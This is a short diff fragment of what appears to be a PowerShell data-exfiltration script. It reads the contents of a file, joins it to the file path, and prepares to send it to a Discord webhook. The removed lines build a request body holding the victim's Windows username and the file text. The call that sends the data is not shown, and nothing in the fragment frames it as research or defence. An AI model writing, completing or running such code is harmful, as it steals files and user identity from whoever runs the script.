@@ -4,11 +4,6 @@ $Content = Get-Content -Path $Path
 
 $text = $Path + $Content
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
 # Discord Connection
 $hookurl = "$discord"
 
